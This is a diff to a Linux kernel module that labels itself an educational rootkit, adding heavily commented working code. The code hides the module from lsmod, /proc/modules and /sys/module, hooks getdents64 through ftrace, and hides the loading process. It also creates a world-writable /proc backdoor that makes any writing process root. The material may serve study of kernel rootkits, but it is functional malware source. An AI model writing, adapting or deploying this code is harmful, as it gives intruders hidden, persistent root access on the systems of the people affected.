@@ -187,6 +187,14 @@ static asmlinkage long hook_getdents64(unsigned int fd,
         offset += cur->d_reclen;
     }
 
+/* Below!
+ * copy_to_user(...) = copies filtered kernel buffer back into userspace, it's the opp of _from_user earlier
+ *                     ret nonzero on fail
+ * -EFAULT = "bad addr", kernel convention for bad memory access
+ * kfree(kbuf) = free kernel buffer
+ * return ret = return (maybe reduced) byte count back to userspace, just like the real syscall
+ */
+
     if (copy_to_user(dirent, kbuf, ret)) {
         kfree(kbuf);
         return -EFAULT;
@@ -195,6 +203,216 @@ static asmlinkage long hook_getdents64(unsigned int fd,
     kfree(kbuf);
     return ret;
 }
+
+/* I'm not gonna keep writing this, all comments point to the section of code below them.
+ * static struct list_head ... = saves a pointer to entry before this in the module list; needed later for reinsertion
+ * THIS_MODULE points to own module's struct module, tracked by the kernel
+ * ->list.prev = kernel stores loaded modules in a doubly linked list; each one has a 'list' field with 'next' and 'prev'
+ *               pointers; this saves prev so I know where I am in the list.
+ * list_del = removes this from the linked list by connecting neighboring modules directly to each other, bypassing this.
+ *            After this, 'lsmod' and '/proc/modules' can't see this rootkit, when they iterate the list this module isn't
+ *            in it.
+ * kobject_del(...) = removes this module from the kernel object hierarchy, which is what /sys/module is directly built
+ *                    from. without this line, the rootkit would still show in that dir as ~/rootkit.
+ * module_show = reinserts this back into list using list_add, which takes the entry to insert and the entry to insert it
+ *               after. I call this to unload this module properly using 'rmmod'.
+ */
+
+static struct list_head *prev_module_list_entry;
+
+static void module_hide(void)
+{
+    prev_module_list_entry = THIS_MODULE->list.prev;
+    list_del(&THIS_MODULE->list);
+    kobject_del(&THIS_MODULE->mkobj.kobj);
+    pr_info("module hidden\n");
+}
+
+static void module_show(void)
+{
+    list_add(&THIS_MODULE->list, prev_module_list_entry);
+    pr_info("module visible\n");
+}
+
+/* char kbuf[16] = {0} = smaller buffer to recieve whatever user writes; needed to accept the write so the syscall doesn't
+ *                       error out
+ * if (count ...) = rejects writes larger than buffer, prevents an overflow error; -EINVAL = "invalid arg"
+ * if (copy_from...) = *safely* copies user's write into kernel space; I'm not USING the data, but skipping this can cause
+ *                     issues with some kernels sooo it's done.; -EFAULT = "bad mem access"
+ * new_creds = prepare_creds() = allocates fresh copy of current process's creds; best practice in kernel modules is NEVER
+ *                               MODIFY CREDS IN PLACE -> always clone, mod clone and the commit change.
+ * if (!new_creds) ... = alloc can fail if system oom, -ENOMEM = "no mem"
+ * new_creds->uid ... = sets every credential field to 0 (root), there are 8 because Linux tracks multiple UID/GUID values
+ *                      per process, listed below because I only knew 4 and not all 8:
+ *                              | uid/gid -> "real" who you actually are
+ *                              | euid/egid -> "effective" what perms you have rn
+ *                              | suid/sgid -> "saved" lets temp drop and regain of privs
+ *                              | fsuid/fsgid -> "fs" used specfically to check file perms
+ * commit_creds(new_creds) = installs modded creds on process, after this line the process is root
+ * return count = returns # of bytes written which is what write syscalls are SUPPOSED to ret on success, imitating
+ */
+
+static ssize_t backdoor_write(struct file *file, const char __user *buf,
+                              size_t count, loff_t *ppos)
+{
+    char kbuf[16] = {0};
+    struct cred *new_creds;
+
+    if (count >= sizeof(kbuf))
+        return -EINVAL;
+
+    if (copy_from_user(kbuf, buf, count))
+        return -EFAULT;
+
+    pr_info("backdoor: escalating current process to root\n");
+
+    new_creds = prepare_creds();
+    if (!new_creds)
+        return -ENOMEM;
+
+    new_creds->uid   = KUIDT_INIT(0);
+    new_creds->gid   = KGIDT_INIT(0);
+    new_creds->euid  = KUIDT_INIT(0);
+    new_creds->egid  = KGIDT_INIT(0);
+    new_creds->suid  = KUIDT_INIT(0);
+    new_creds->sgid  = KGIDT_INIT(0);
+    new_creds->fsuid = KUIDT_INIT(0);
+    new_creds->fsgid = KGIDT_INIT(0);
+
+    commit_creds(new_creds);
+    pr_info("backdoor: done\n");
+    return count;
+}
+
+/* static const char msg[] = static string describing what backdoor does
+ * simple_read_from_buffer... = kernel helper that handles all the details of returning a string from a /proc read
+ *                              correctly, handles partial reads, the ppos offset and copying to userspace. sizeof(msg) - 1
+ *                              excludes null terminator, w/o this you'd need the manually handle all those cases.
+ *      What's ppos? position pointer, tracks where in the file the current read is up to; example of this working is how
+ *                   the kernel handles cat not reading all in one call
+ */
+
+static ssize_t backdoor_read(struct file *file, char __user *buf,
+                             size_t count, loff_t *ppos)
+{
+    static const char msg[] =
+    "Educational rootkit backdoor.\n"
+    "Write anything to this file to get root.\n"
+    "Example:  echo 1 > /proc/" BACKDOOR_ENTRY "\n";
+    return simple_read_from_buffer(buf, count, ppos, msg, sizeof(msg) - 1);
+}
+
+/* Compatibility block -> kernel 5.6 switched from struct file_operations to struct proc_ops
+ * They're both structs full of function pointers, and they're called from the kernel when someone reads or writes a /proc entry. In this I only care about r/w, so I just leave the rest NULL and don't write to them.
+ *
+ * static struct proc_dir_entry ... = a pointer to the /proc entry once it's created to point back to later
+ */
+
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 6, 0)
+static const struct proc_ops backdoor_fops = {
+    .proc_read = backdoor_read,
+    .write = backdoor_write,
+};
+#else
+static const struct file_operations backdoor_fops = {
+    .read = backdoor_read,
+    .write = backdoor_write,
+};
+#endif
+
+static struct proc_dir_entry *backdoor_proc_entry;
+
+/* Hook macro from ftrace_helper get used here; creates an array with 1 entry from the getdents64 hook
+ * If I wanted to hook more syscalls, I'd add more lines here.
+ * &orig_getdents64 = addr of function pointer variable
+ * ftrace_helper is gonna write the real syscall's addr to it
+ */
+
+static struct ftrace_hook hooks[] = {
+    HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
+};
+
+/* __init = tells kernel this function is only needed at load time, and after it's done running it can free the mem from it
+ * ARRAY_SIZE(hooks) = kernel macro that returns the # of elements in an array, which is safer than hardcoding a #
+ * fh_install_hooks = installs ftrace hooks from hook table; if it fails ret err & nothing else runs
+ * proc_create(...) = creates /proc entry, the NULL means parent directory (root of /proc) and the last is file op struct
+ * if (!backdoor_proc_entry) = If create fail, clean up hooks already installed before ret
+ * hide_pid(current->pid) = hides current process (the one loading the module) from /proc; 'current' is a kernel macro that
+ *                          always points to the currently executing task
+ * module_hide() = runs func I made, hides module from lsmod etc, etc. This needs done last so any errors above are still
+ *                 visible in dmesg.
+ */
+
+static int __init rookit_init(void)
+{
+    int err;
+
+    pr_info("Loading ... b4$hBunni:~# Rootkit v1.0");
+
+    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
+    if (err) {
+        pr_err("Failed to install hooks: %d\n", err);
+        return err;
+    }
+    pr_info("'getdents64' Successfully Hooked\n");
+
+    backdoor_proc_entry = proc_create(BACKDOOR_ENTRY, 0666, NULL,
+                                      &backdoor_fops);
+    if (!backdoor_proc_entry) {
+        pr_err("Failed to create /proc/" BACKDOOR_ENTRY "\n");
+        fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
+        return -ENOMEM;
+    }
+    pr_info("Backdoor created at: /proc/" BACKDOOR_ENTRY "\n");
+
+    hide_pid(current->pid);
+    module_hide();
+
+    pr_info("Ready...\n");
+    return 0;
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
